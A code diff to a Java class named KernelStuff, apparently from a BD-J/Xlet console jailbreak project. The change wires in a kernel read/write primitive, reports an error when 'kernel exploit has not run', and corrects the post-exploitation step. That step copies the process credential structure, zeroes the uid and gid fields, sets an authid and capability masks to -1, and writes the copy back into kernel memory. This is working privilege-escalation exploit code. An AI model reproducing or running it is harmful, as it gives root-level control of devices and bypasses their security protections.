@@ -13,10 +13,16 @@ public class KernelStuff
     private static long read = 0;
     private static long write = 0;
 
+    public static void setRW(KernelRW k)
+    {
+        if(krw == null)
+            krw = k;
+    }
+
     private static void init() throws Exception
     {
         if(krw == null)
-            krw = MyXlet.krw;
+            throw new Exception("kernel exploit has not run");
         if(pipe_r < 0)
         {
             long mem8 = NativeUtils.allocateMemory(8);
@@ -81,14 +87,14 @@ public class KernelStuff
         long cred = krw.kread8(curproc+0x40);
         long mem = NativeUtils.allocateMemory(0x70);
         copyout(mem, cred, 0x70);
-        NativeUtils.putInt(cred+4, 0); //cr_uid
-        NativeUtils.putInt(cred+8, 0); //cr_ruid
-        NativeUtils.putInt(cred+12, 0); //cr_svuid
-        NativeUtils.putInt(cred+20, 0); //cr_rgid
-        NativeUtils.putInt(cred+24, 0); //cr_svgid
-        NativeUtils.putLong(cred+88, authid);
-        NativeUtils.putLong(cred+96, -1);
-        NativeUtils.putLong(cred+104, -1);
+        NativeUtils.putInt(mem+4, 0); //cr_uid
+        NativeUtils.putInt(mem+8, 0); //cr_ruid
+        NativeUtils.putInt(mem+12, 0); //cr_svuid
+        NativeUtils.putInt(mem+20, 0); //cr_rgid
+        NativeUtils.putInt(mem+24, 0); //cr_svgid
+        NativeUtils.putLong(mem+88, authid);
+        NativeUtils.putLong(mem+96, -1);
+        NativeUtils.putLong(mem+104, -1);
         copyin(cred, mem, 0x70);
         long fd = krw.kread8(curproc+0x48);
         long pid1 = pfind0(1);
